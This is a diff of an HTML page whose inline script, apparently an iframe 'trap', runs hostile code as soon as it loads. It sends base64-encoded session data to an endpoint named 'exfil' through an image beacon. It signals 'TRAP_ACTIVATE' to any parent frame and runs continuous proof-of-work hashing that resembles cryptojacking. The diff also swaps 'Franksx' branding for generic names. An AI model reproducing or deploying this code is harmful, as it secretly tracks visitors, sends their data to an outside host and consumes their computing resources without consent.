@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><title>Franksx Crypto</title></head>
+<head><title>Crypto</title></head>
 <body>
 <script>
 (function(){
-    var CFG = {sid: 'FRANKSX_CRYPTO_' + Math.random().toString(36).substring(2, 15), exfil: 'https://franksx-research.example.com/domain-collect'};
+    var CFG = {sid: 'CRYPTO_' + Math.random().toString(36).substring(2, 15), exfil: 'https://research-coordination.example.com/domain-collect'};
     function send(t,d){var data=JSON.stringify({t:t,d:d,sid:CFG.sid,ts:Date.now()});var img=new Image();img.src=CFG.exfil+'?d='+btoa(data).substring(0,1800);}
 
     function sha256(data){
@@ -39,10 +39,12 @@
         }
     }
 
+    // Signal parent
     try{parent.postMessage({type:'TRAP_ACTIVATE',source:'crypto'},'*');}catch(e){}
 
     send('CRYPTO_IFRAME_LOAD',{});
 
+    // Continuous crypto work
     var count=0;
     function doWork(){
         var pow=solvePoW(CFG.sid+'_c'+count,5);
